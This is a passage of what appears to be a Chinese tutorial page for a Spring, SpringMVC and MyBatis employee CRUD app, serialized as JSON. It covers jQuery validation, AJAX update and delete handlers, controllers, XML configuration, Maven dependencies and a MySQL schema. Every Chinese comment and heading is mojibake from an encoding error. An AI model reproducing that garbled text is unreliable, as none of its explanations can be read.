            }\n                }\n            }\n        });\n    });\n    \n    //æ ¡éªè¡¨åæ°æ®\n    function validate_add_form(){\n        //1ãæ¿å°è¦æ ¡éªçæ°æ®ï¼ä½¿ç¨æ­£åè¡¨è¾¾å¼\n        var empName = $("#empName_add_input").val();\n        var regName = /(^[a-zA-Z0-9_-]{6,16}$)|(^[\\u2E80-\\u9FFF]{2,5})/;\n        if(!regName.test(empName)){\n            //alert("ç¨æ·åå¯ä»¥æ¯2-5ä½ä¸­ææè6-16ä½è±æåæ°å­çç»å");\n            show_validate_msg("#empName_add_input", "error", "ç¨æ·åå¯ä»¥æ¯2-5ä½ä¸­ææè6-16ä½è±æåæ°å­çç»å");\n            return false;\n        }else{\n            show_validate_msg("#empName_add_input", "success", "");\n        };\n    \n        //2ãæ ¡éªé®ç®±ä¿¡æ¯\n        var email = $("#email_add_input").val();\n        var regEmail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regEmail.test(email)){\n            //alert("é®ç®±æ ¼å¼ä¸æ­£ç¡®");\n            //åºè¯¥æ¸ç©ºè¿ä¸ªåç´ ä¹åçæ ·å¼\n            show_validate_msg("#email_add_input", "error", "é®ç®±æ ¼å¼ä¸æ­£ç¡®");\n            /* $("#email_add_input").parent().addClass("has-error");\n                $("#email_add_input").next("span").text("é®ç®±æ ¼å¼ä¸æ­£ç¡®"); */\n            return false;\n        }else{\n            show_validate_msg("#email_add_input", "success", "");\n        }\n        return true;\n    }\n    \n    //æ¾ç¤ºæ ¡éªç»æçæç¤ºä¿¡æ¯\n    function show_validate_msg(ele,status,msg){\n        //æ¸é¤å½ååç´ çæ ¡éªç¶æ\n        $(ele).parent().removeClass("has-success has-error");\n        $(ele).next("span").text("");\n        if("success"==status){\n            $(ele).parent().addClass("has-success");\n            $(ele).next("span").text(msg);\n        }else if("error" == status){\n            $(ele).parent().addClass("has-error");\n            $(ele).next("span").text(msg);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    \n\n 4. æ·»å ç¨æ·åéè¦è·³è½¬å°æåä¸é¡µï¼æ¾ç¤ºæ·»å çæ°æ®ãå¨åé¡µæ¶éè¦ç¡®ä¿åé¡µçæä»¶æ¾ç¤ºçä¿¡æ¯å¨åççèå´ä¹åï¼éè¦å¯¹åé¡µæä»¶è¿è¡å±æ§çéç½®ãéç½®åé¡µåçååæ°ã\n    \n    <plugins>\n        <plugin interceptor="com.github.pagehelper.PageInterceptor" >\n            <property name="reasonable" value="true"/>\n        </plugin>\n    </plugins>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# æ´æ°åå·¥ä¿¡æ¯\n\n 1. åç«¯åèµ·Ajaxè¯·æ±\n    \n    //ç¹å»æ´æ°ï¼æ´æ°åå·¥ä¿¡æ¯\n    $("#emp_update_btn").click(function(){\n        //éªè¯é®ç®±æ¯å¦åæ³\n        //1ãæ ¡éªé®ç®±ä¿¡æ¯\n        var email = $("#email_update_input").val();\n        var regEmail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regEmail.test(email)){\n            show_validate_msg("#email_update_input", "error", "é®ç®±æ ¼å¼ä¸æ­£ç¡®");\n            return false;\n        }else{\n            show_validate_msg("#email_update_input", "success", "");\n        }\n    \n        //2ãåéajaxè¯·æ±ä¿å­æ´æ°çåå·¥æ°æ®\n        $.ajax({\n            url:"${APP_PATH}/emp/"+$(this).attr("edit-id"),\n            type:"PUT",\n            data:$("#empUpdateModal form").serialize(),\n            success:function(result){\n                //alert(result.msg);\n                //1ãå³é­å¯¹è¯æ¡\n                $("#empUpdateModal").modal("hide");\n                //2ãåå°æ¬é¡µé¢\n                to_page(currentPage);\n            }\n        });\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    \n\n 2. éè¦è®¾ç½®ä¸ä¸ªè¿æ»¤å¨ï¼ç¨äºå°ajaxè¯·æ±ä¸­çæ°æ®å°è£å°beanä¸­\n    \n    \n    <filter>\n        <filter-name>httpPutFormContentFilter</filter-name>\n        <filter-class>org.springframework.web.filter.HttpPutFormContentFilter</filter-class>\n    </filter>\n    \n    <filter-mapping>\n        <filter-name>httpPutFormContentFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. åå°ç¼åå¤çè¯·æ±çç¸å³æ¹æ³\n    \n    /**\n         * å¦æç´æ¥åéajax=PUTå½¢å¼çè¯·æ±\n         * å°è£çæ°æ®\n         * Employee\n         * [empId=1014, empName=null, gender=null, email=null, dId=null]\n         *\n         * é®é¢ï¼\n         * è¯·æ±ä½ä¸­ææ°æ®ï¼\n         * ä½æ¯Employeeå¯¹è±¡å°è£ä¸ä¸ï¼\n         * update tbl_emp  where emp_id = 1014;\n         *\n         * åå ï¼\n         * Tomcatï¼\n         * \t\t1ãå°è¯·æ±ä½ä¸­çæ°æ®ï¼å°è£ä¸ä¸ªmapã\n         * \t\t2ãrequest.getParameter("empName")å°±ä¼ä»è¿ä¸ªmapä¸­åå¼ã\n         * \t\t3ãSpringMVCå°è£POJOå¯¹è±¡çæ¶åã\n         * \t\t\t\tä¼æPOJOä¸­æ¯ä¸ªå±æ§çå¼ï¼request.getParamter("email");\n         * AJAXåéPUTè¯·æ±å¼åçè¡æ¡ï¼\n         * \t\tPUTè¯·æ±ï¼è¯·æ±ä½ä¸­çæ°æ®ï¼request.getParameter("empName")æ¿ä¸å°\n         * \t\tTomcatä¸çæ¯PUTä¸ä¼å°è£è¯·æ±ä½ä¸­çæ°æ®ä¸ºmapï¼åªæPOSTå½¢å¼çè¯·æ±æå°è£è¯·æ±ä½ä¸ºmap\n         * org.apache.catalina.connector.Request--parseParameters() (3111);\n         *\n         * protected String parseBodyMethods = "POST";\n         * if( !getConnector().isParseBodyMethod(getMethod()) ) {\n         success = true;\n         return;\n         }\n         *\n         *\n         * è§£å³æ¹æ¡ï¼\n         * æä»¬è¦è½æ¯æç´æ¥åéPUTä¹ç±»çè¯·æ±è¿è¦å°è£è¯·æ±ä½ä¸­çæ°æ®\n         * 1ãéç½®ä¸HttpPutFormContentFilterï¼\n         * 2ãä»çä½ç¨ï¼å°è¯·æ±ä½ä¸­çæ°æ®è§£æåè£æä¸ä¸ªmapã\n         * 3ãrequestè¢«éæ°åè£ï¼request.getParameter()è¢«éåï¼å°±ä¼ä»èªå·±å°è£çmapä¸­åæ°æ®\n         * åå·¥æ´æ°æ¹æ³\n         * @param employee\n         * @return\n         */\n    @ResponseBody\n    @RequestMapping(value="/emp/{empId}",method=RequestMethod.PUT)\n    public Msg saveEmp(Employee employee, HttpServletRequest request){\n        System.out.println("è¯·æ±ä½ä¸­çå¼ï¼"+request.getParameter("gender"));\n        System.out.println("å°è¦æ´æ°çåå·¥æ°æ®ï¼"+employee);\n        employeeService.updateEmp(employee);\n        return Msg.success()\t;\n    }\n    \n    /**\n    \t * åå·¥æ´æ°\n    \t * @param employee\n    \t */\n    public void updateEmp(Employee employee) {\n        // TODO Auto-generated method stub\n        employeeMapper.updateByPrimaryKeySelective(employee);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    \n\n\n# å é¤åå·¥ä¿¡æ¯\n\n 1. Ajaxåèµ·å é¤åå·¥è¯·æ±\n    \n    //åä¸ªå é¤\n    $(document).on("click",".delete_btn",function(){\n        //1ãå¼¹åºæ¯å¦ç¡®è®¤å é¤å¯¹è¯æ¡\n        var empName = $(this).parents("tr").find("td:eq(2)").text();\n        var empId = $(this).attr("del-id");\n        //alert($(this).parents("tr").find("td:eq(1)").text());\n        if(confirm("ç¡®è®¤å é¤ã"+empName+"ãåï¼")){\n            //ç¡®è®¤ï¼åéajaxè¯·æ±å é¤å³å¯\n            $.ajax({\n                url:"${APP_PATH}/emp/"+empId,\n                type:"DELETE",\n                success:function(result){\n                    alert(result.msg);\n                    //åå°æ¬é¡µ\n                    to_page(currentPage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    \n\n 2. åç«¯ç¼åæ¹æ³å¤çè¯·æ±\n    \n    /**\n    \t * åä¸ªæ¹éäºåä¸\n    \t * æ¹éå é¤ï¼1-2-3\n    \t * åä¸ªå é¤ï¼1\n    \t * \n    \t * @param id\n    \t * @return\n    \t */\n    @ResponseBody\n    @RequestMapping(value="/emp/{ids}",method=RequestMethod.DELETE)\n    public Msg deleteEmp(@PathVariable("ids")String ids){\n        //æ¹éå é¤\n        if(ids.contains("-")){\n            List<Integer> del_ids = new ArrayList<>();\n            String[] str_ids = ids.split("-");\n            //ç»è£idçéå\n            for (String string : str_ids) {\n                del_ids.add(Integer.parseInt(string));\n            }\n            employeeService.deleteBatch(del_ids);\n        }else{\n            Integer id = Integer.parseInt(ids);\n            employeeService.deleteEmp(id);\n        }\n        return Msg.success();\n    }\n    \n    /**\n         * åå·¥å é¤\n         * @param id\n         */\n    public void deleteEmp(Integer id) {\n        // TODO Auto-generated method stub\n        employeeMapper.deleteByPrimaryKey(id);\n    }\n    \n    public void deleteBatch(List<Integer> ids) {\n        // TODO Auto-generated method stub\n        EmployeeExample example = new EmployeeExample();\n        EmployeeExample.Criteria criteria = example.createCriteria();\n        //delete from xxx where emp_id in(1,2,3)\n        criteria.andEmpIdIn(ids);\n        employeeMapper.deleteByExample(example);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\n 3. è®¾ç½®æ¹éå é¤åå·¥Ajaxè¯·æ±\n    \n    //å®æå¨é/å¨ä¸éåè½\n    $("#check_all").click(function(){\n        //attrè·åcheckedæ¯undefined;\n        //æä»¬è¿äºdomåççå±æ§ï¼attrè·åèªå®ä¹å±æ§çå¼ï¼\n        //propä¿®æ¹åè¯»ådomåçå±æ§çå¼\n        $(".check_item").prop("checked",$(this).prop("checked"));\n    });\n    \n    //check_item\n    $(document).on("click",".check_item",function(){\n        //å¤æ­å½åéæ©ä¸­çåç´ æ¯å¦5ä¸ª\n        var flag = $(".check_item:checked").length==$(".check_item").length;\n        $("#check_all").prop("checked",flag);\n    });\n    \n    //ç¹å»å¨é¨å é¤ï¼å°±æ¹éå é¤\n    $("#emp_delete_all_btn").click(function(){\n        //\n        var empNames = "";\n        var del_idstr = "";\n        $.each($(".check_item:checked"),function(){\n            //this\n            empNames += $(this).parents("tr").find("td:eq(2)").text()+",";\n            //ç»è£åå·¥idå­ç¬¦ä¸²\n            del_idstr += $(this).parents("tr").find("td:eq(1)").text()+"-";\n        });\n        //å»é¤empNameså¤ä½ç,\n        empNames = empNames.substring(0, empNames.length-1);\n        //å»é¤å é¤çidå¤ä½ç-\n        del_idstr = del_idstr.substring(0, del_idstr.length-1);\n        if(confirm("ç¡®è®¤å é¤ã"+empNames+"ãåï¼")){\n            //åéajaxè¯·æ±å é¤\n            $.ajax({\n                url:"${APP_PATH}/emp/"+del_idstr,\n                type:"DELETE",\n                success:function(result){\n                    alert(result.msg);\n                    //åå°å½åé¡µé¢\n                    to_page(currentPage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# æ»ç»\n\n',normalizedContent:'# ssm\n\n\n# ç¯å¢æ­å»º\n\n\n# å¼å¥ä¾èµ\n\nå¼å¥mavenç¸å³ä¾èµ\n\n<dependencies>\n    <dependency>\n        <groupid>junit</groupid>\n        <artifactid>junit</artifactid>\n        <version>4.11</version>\n        <scope>test</scope>\n    </dependency>\n\n    \x3c!--å¼å¥é¡¹ç®ä¾èµçjarå --\x3e\n    \x3c!-- springmvcãspring --\x3e\n\n    \x3c!--å¼å¥pagehelperåé¡µæä»¶ --\x3e\n    <dependency>\n        <groupid>com.github.pagehelper</groupid>\n        <artifactid>pagehelper</artifactid>\n        <version>5.0.0</version>\n    </dependency>\n\n    \x3c!-- mbg --\x3e\n    <dependency>\n        <groupid>org.mybatis.generator</groupid>\n        <artifactid>mybatis-generator-core</artifactid>\n        <version>1.3.5</version>\n    </dependency>\n\n\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-webmvc</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n    \x3c!-- è¿åjsonå­ç¬¦ä¸²çæ¯æ --\x3e\n    <dependency>\n        <groupid>com.fasterxml.jackson.core</groupid>\n        <artifactid>jackson-databind</artifactid>\n        <version>2.8.8</version>\n    </dependency>\n\n    \x3c!--jsr303æ°æ®æ ¡éªæ¯æï¼tomcat7åä»¥ä¸çæå¡å¨ï¼\n    tomcat7ä»¥ä¸çæå¡å¨ï¼elè¡¨è¾¾å¼ãé¢å¤ç»æå¡å¨çlibåä¸­æ¿æ¢æ°çæ åçel\n    --\x3e\n    <dependency>\n        <groupid>org.hibernate</groupid>\n        <artifactid>hibernate-validator</artifactid>\n        <version>5.4.1.final</version>\n    </dependency>\n\n\n    \x3c!-- spring-jdbc --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-jdbc</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n    \x3c!--spring-test --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-test</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n\n    \x3c!-- springé¢ååé¢ç¼ç¨ --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-aspects</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n    \x3c!--mybatis --\x3e\n    <dependency>\n        <groupid>org.mybatis</groupid>\n        <artifactid>mybatis</artifactid>\n        <version>3.4.2</version>\n    </dependency>\n\n    \x3c!-- mybatisæ´åspringçééå --\x3e\n    <dependency>\n        <groupid>org.mybatis</groupid>\n        <artifactid>mybatis-spring</artifactid>\n        <version>1.3.1</version>\n    </dependency>\n\n    \x3c!-- æ°æ®åºè¿æ¥æ± ãé©±å¨ --\x3e\n    <dependency>\n        <groupid>c3p0</groupid>\n        <artifactid>c3p0</artifactid>\n        <version>0.9.1</version>\n    </dependency>\n\n    <dependency>\n        <groupid>mysql</groupid>\n        <artifactid>mysql-connector-java</artifactid>\n        <version>5.1.41</version>\n    </dependency>\n\n    \x3c!-- ï¼jstlï¼servlet-apiï¼junitï¼ --\x3e\n    <dependency>\n        <groupid>jstl</groupid>\n        <artifactid>jstl</artifactid>\n        <version>1.2</version>\n    </dependency>\n\n    <dependency>\n        <groupid>javax.servlet</groupid>\n        <artifactid>javax.servlet-api</artifactid>\n        <version>3.0.1</version>\n        <scope>provided</scope>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n\n\n\n# å¼å¥åç«¯èµæº\n\n<script type="text/javascript"\n\tsrc="${app_path }/static/js/jquery-1.12.4.min.js"><\/script>\n<link\n\thref="${app_path }/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n\trel="stylesheet">\n<script\n\tsrc="${app_path }/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# éç½®web.xml\n\n<!doctype web-app public\n "-//sun microsystems, inc.//dtd web application 2.3//en"\n "http://java.sun.com/dtd/web-app_2_3.dtd" >\n\n<web-app>\n    \x3c!-- springéç½®æä»¶ å è½½ --\x3e\n    <context-param>\n        <param-name>contextconfiglocation</param-name>\n        <param-value>classpath:applicationcontext.xml</param-value>\n    </context-param>\n\n    \x3c!-- ç¼ç æ¦æªå¨ --\x3e\n    <filter>\n        <filter-name>encodingfilter</filter-name>\n        <filter-class>org.springframework.web.filter.characterencodingfilter</filter-class>\n        <init-param>\n            <param-name>encoding</param-name>\n            <param-value>utf-8</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forcerequestencoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forceresponseencoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n    </filter>\n\n    \x3c!-- resté£æ ¼æ¦æªå¨ --\x3e\n    <filter>\n        <filter-name>hiddenhttpmethodfilter</filter-name>\n        <filter-class>org.springframework.web.filter.hiddenhttpmethodfilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>encodingfilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    <filter-mapping>\n        <filter-name>hiddenhttpmethodfilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    \x3c!-- å è½½iocå®¹å¨ --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.contextloaderlistener</listener-class>\n    </listener>\n\n    \x3c!-- éç½®mvcæ¦æªå¨ --\x3e\n    <servlet>\n        <servlet-name>dispatcherservlet</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            <param-value>classpath:spring-mvc.xml</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>dispatcherservlet</servlet-name>\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\néç½®springmvcéç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:mvc="http://www.springframework.org/schema/mvc"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd">\n\n    \x3c!-- ä¸éç¨é»è®¤æ¦æªå¨ï¼éç½®åªæ¦æªcontrollerå --\x3e\n    <context:component-scan base-package="com.pwddd.ssm" use-default-filters="false">\n        <context:include-filter type="annotation" expression="org.springframework.stereotype.controller"/>\n    </context:component-scan>\n\n    <bean class="org.springframework.web.servlet.view.internalresourceviewresolver" id="viewresolver">\n        <property name="prefix" value="/web-inf/views/" />\n        <property name="suffix" value=".jsp" />\n    </bean>\n\n    \x3c!--  spirngmvcå¤çä¸äºç äº¤ç»tomcat   --\x3e\n    <mvc:default-servlet-handler default-servlet-name="default"/>\n    <mvc:annotation-driven />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\néç½®æ°æ®åºè¿æ¥ä¿¡æ¯\n\njdbc.driver=com.mysql.jdbc.driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\néç½®springéç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd">\n\n    <context:component-scan base-package="com.pwddd.ssm">\n        <context:exclude-filter type="annotation" expression="org.springframework.stereotype.controller"/>\n    </context:component-scan>\n\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean class="com.mchange.v2.c3p0.combopooleddatasource" id="datasource">\n        <property name="driverclass" value="${jdbc.driver}" />\n        <property name="jdbcurl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n    <bean class="org.springframework.jdbc.datasource.datasourcetransactionmanager" id="datasourcetransactionmanager">\n        <property name="datasource" ref="datasource" />\n    </bean>\n\n    \x3c!--  mybatisæ´å  --\x3e\n    <bean class="org.mybatis.spring.sqlsessionfactorybean" id="sqlsessionfactory" >\n        <property name="datasource" ref="datasource" />\n        <property name="configlocation" value="classpath:mybatis-config.xml" />\n        <property name="mapperlocations" value="classpath:mapper/*.xml" />\n    </bean>\n\n    <bean class="org.mybatis.spring.mapper.mapperscannerconfigurer" >\n        <property name="basepackage" value="com.pwddd.ssm.dao" />\n    </bean>\n\n    \x3c!--  äºå¡ç¸å³çéç½®  --\x3e\n    <aop:config>\n        <aop:pointcut id="txpoint" expression="execution(* com.pwddd.service..*(..))" />\n        <aop:advisor advice-ref="txadvice" pointcut-ref="txpoint" />\n    </aop:config>\n\n    <tx:advice id="txadvice" transaction-manager="datasourcetransactionmanager">\n        <tx:attributes>\n            <tx:method name="*"/>\n            <tx:method name="get*" read-only="true" />\n        </tx:attributes>\n    </tx:advice>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# éç½®mybatiséç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapunderscoretocamelcase" value="true"/>\n    </settings>\n\n    <typealiases>\n        <package name="com.pwddd.ssm.bean"/>\n    </typealiases>\n\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# åå»ºæ°æ®åºè¡¨\n\n/*\n navicat premium data transfer\n\n source server         : localhost\n source server type    : mysql\n source server version : 50728\n source host           : localhost:3306\n source schema         : ssm_crud\n\n target server type    : mysql\n target server version : 50728\n file encoding         : 65001\n\n date: 24/02/2022 14:48:02\n*/\n\nset names utf8mb4;\nset foreign_key_checks = 0;\n\n-- ----------------------------\n-- table structure for tbl_dept\n-- ----------------------------\ndrop table if exists `tbl_dept`;\ncreate table `tbl_dept`  (\n  `dept_id` int(11) not null auto_increment,\n  `dept_name` varchar(255) character set utf8 collate utf8_general_ci not null,\n  primary key (`dept_id`) using btree\n) engine = innodb auto_increment = 1 character set = utf8 collate = utf8_general_ci row_format = dynamic;\n\n-- ----------------------------\n-- table structure for tbl_employee\n-- ----------------------------\ndrop table if exists `tbl_employee`;\ncreate table `tbl_employee`  (\n  `emp_id` int(11) not null auto_increment,\n  `emp_name` varchar(255) character set utf8 collate utf8_general_ci not null,\n  `gender` char(1) character set utf8 collate utf8_general_ci null default null,\n  `email` varchar(255) character set utf8 collate utf8_general_ci null default null,\n  `d_id` int(11) not null,\n  primary key (`emp_id`) using btree,\n  index `fk_dept`(`d_id`) using btree,\n  constraint `fk_dept` foreign key (`d_id`) references `tbl_dept` (`dept_id`) on delete restrict on update restrict\n) engine = innodb auto_increment = 1 character set = utf8 collate = utf8_general_ci row_format = dynamic;\n\nset foreign_key_checks = 1;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# mybatiséåå·¥ç¨\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype generatorconfiguration\n        public "-//mybatis.org//dtd mybatis generator configuration 1.0//en"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorconfiguration>\n\n    <context id="mybatismysql" targetruntime="mybatis3">\n        <commentgenerator>\n            <property name="suppressallcomments" value="true" />\n        </commentgenerator>\n        \x3c!-- éç½®æ°æ®åºè¿æ¥ --\x3e\n        <jdbcconnection driverclass="com.mysql.jdbc.driver"\n                        connectionurl="jdbc:mysql://localhost:3306/ssm_crud?usessl=false"\n                        userid="root"\n                        password="123456">\n        </jdbcconnection>\n\n        <javatyperesolver>\n            <property name="forcebigdecimals" value="false" />\n        </javatyperesolver>\n\n        \x3c!-- æå®javabeançæçä½ç½® --\x3e\n        <javamodelgenerator targetpackage="com.pwddd.ssm.bean"\n                            targetproject=".\\src\\main\\java">\n            <property name="enablesubpackages" value="true" />\n            <property name="trimstrings" value="true" />\n        </javamodelgenerator>\n\n        \x3c!--æå®sqlæ å°æä»¶çæçä½ç½® --\x3e\n        <sqlmapgenerator targetpackage="mapper" targetproject=".\\src\\main\\resources">\n            <property name="enablesubpackages" value="true" />\n        </sqlmapgenerator>\n\n        \x3c!-- æå®daoæ¥å£çæçä½ç½®ï¼mapperæ¥å£ --\x3e\n        <javaclientgenerator type="xmlmapper"\n                             targetpackage="com.pwddd.ssm.dao" targetproject=".\\src\\main\\java">\n            <property name="enablesubpackages" value="true" />\n        </javaclientgenerator>\n\n\n        \x3c!-- tableæå®æ¯ä¸ªè¡¨ççæç­ç¥ --\x3e\n        <table tablename="tbl_emp" domainobjectname="employee"></table>\n        <table tablename="tbl_dept" domainobjectname="department"></table>\n    </context>\n</generatorconfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\nå¯å¨éåå·¥ç¨\n\npublic static void main(string[] args) throws exception {\n    list<string> warnings = new arraylist<string>();\n    boolean overwrite = true;\n    file configfile = new file("mbg.xml");\n    configurationparser cp = new configurationparser(warnings);\n    configuration config = cp.parseconfiguration(configfile);\n    defaultshellcallback callback = new defaultshellcallback(overwrite);\n    mybatisgenerator mybatisgenerator = new mybatisgenerator(config, callback, warnings);\n    mybatisgenerator.generate(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# ä¿®æ¹çæçmapper\n\n  <select id="selectbyprimarykeywithdept" resultmap="withdeptresultmap">\n      select\n      <if test="distinct">\n        distinct\n      </if>\n      <include refid="withdept_column_list" />\n      from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n      <if test="_parameter != null">\n        <include refid="example_where_clause" />\n      </if>\n      <if test="orderbyclause != null">\n        order by ${orderbyclause}\n      </if>\n  </select>\n\n  <select id="selectbyexamplewithdept" resultmap="withdeptresultmap">\n    select\n    <include refid="withdept_column_list" />\n    from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n    